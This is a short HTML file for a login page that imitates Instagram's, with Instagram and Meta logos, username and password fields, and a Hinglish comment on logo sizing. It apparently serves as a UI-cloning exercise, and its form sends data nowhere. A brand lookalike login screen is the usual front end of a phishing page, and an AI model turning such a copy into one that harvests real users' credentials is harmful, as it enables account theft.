<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="login-container">
    <p style="font-size: 12px; color: #8e8e8e;">English (UK)</p>
    
    <!-- Class add karke logo size control karein -->
    <img src="instagram-logo.png" alt="Instagram Logo" class="logo">

    <form style="width: 100%;">
      <input type="text" placeholder="Username, email address or mobile number" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>

    <a href="#">Forgotten password?</a>
    <a href="#" style="margin-top: 25px; font-weight: bold; color: #0095f6;">Create new account</a>

    <img src="meta-logo.png" alt="Meta" class="meta-logo">
  </div>

</body>
</html>
